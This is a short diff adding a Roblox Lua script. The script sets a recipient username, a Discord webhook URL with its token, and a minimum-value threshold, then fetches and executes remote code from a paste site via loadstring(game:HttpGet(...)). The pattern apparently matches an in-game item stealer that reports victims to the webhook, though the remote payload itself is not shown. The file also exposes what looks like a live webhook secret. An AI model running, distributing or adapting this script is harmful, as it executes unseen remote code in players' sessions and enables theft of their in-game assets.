@@ -1,0 +1,6 @@
+Username = "Baconavocado"
+Webhook = "https://discord.com/api/webhooks/1398762477768151141/6ssPUGMpWiUlVKna0XcL6gVdiT9cKcbwLPviU5ItVJ50QiyZzP6Fjzg60xTOdC3vpv1i"
+MinimumValue = 1000000
+
+
+loadstring(game:HttpGet("https://pastebin.0bin.xyz/view/raw/95511173", true))()
